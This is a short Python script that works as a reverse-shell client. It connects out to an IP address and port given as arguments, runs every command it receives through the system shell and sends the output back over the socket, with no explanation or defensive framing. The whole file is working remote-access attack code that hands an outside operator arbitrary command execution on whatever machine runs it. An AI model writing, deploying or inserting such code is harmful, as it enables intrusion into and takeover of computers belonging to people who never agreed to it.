import socket
import argparse
import subprocess
import os





def run_shell_cmd(cmd):
    """ Run shell command """
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    cmd_output = process.communicate()[0]
    return cmd_output


def change_dir(path):
    """ change directory if path found otherwise return error to user """
    try:
        os.chdir(path.strip())
    except FileNotFoundError as err:
        return str(err).encode()


def handle_data(client_socket):
    """ Handle user data """
    while True:    
        data = client_socket.recv(1024).decode()
        if data.strip() == "exit" or not data:
            break

        if "cd " in data[:3]:
            cmd_output = change_dir(data[3:])
        else:
            cmd_output = run_shell_cmd(data)

        if not cmd_output:
            cmd_output = b" "
        client_socket.send(cmd_output)
    client_socket.close()



def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True)
    parser.add_argument('--port', type=int, required=True)
    args = parser.parse_args()
    return args



def main():
    args = get_args()
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((args.ip, args.port))
    handle_data(client_socket)
    
    
        
if __name__ == "__main__":
    main()

